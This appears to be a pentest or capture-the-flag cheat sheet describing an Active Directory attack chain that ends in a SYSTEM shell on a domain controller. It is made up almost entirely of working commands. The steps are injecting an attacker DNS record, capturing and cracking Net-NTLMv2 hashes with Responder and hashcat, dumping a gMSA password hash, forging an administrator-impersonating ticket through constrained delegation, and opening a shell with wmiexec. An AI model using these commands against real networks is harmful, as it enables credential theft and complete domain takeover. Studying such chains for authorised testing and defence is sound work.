# gMSA Password Read + Constrained Delegation → SYSTEM

**Step 1 — DNS record injection to capture Net-NTLMv2 hash:**
```bash
# Add A record pointing to attacker (requires AD user creds)
python3 dnstool.py -u 'DOMAIN\user' -p '<pass>' \
  --action add --record web-attacker --data <LHOST> --type A <DC_IP>
# Start Responder
sudo responder -I tun0
# Wait for PS script to make HTTP request → captures hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Step 2 — Read gMSA password:**
```bash
python3 gMSADumper.py -u <user> -p <pass> -l <DC_IP> -d <DOMAIN>
# Returns NTLM hash: svc_account$:::5e47bac787e5e1970cf9acdb5b316239
```

**Step 3 — Silver ticket for constrained delegation (getST.py):**
```bash
sudo ntpdate <DC_IP>   # sync clock
getST.py -dc-ip <DC_IP> -spn www/dc.<DOMAIN> \
  -hashes :<NTLM_HASH> -impersonate administrator \
  <DOMAIN>/svc_account$
```

**Step 4 — Shell:**
```bash
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass \
  administrator@dc.<DOMAIN>
```

**Bloodhound** to identify which users can read gMSA passwords and delegation rights.
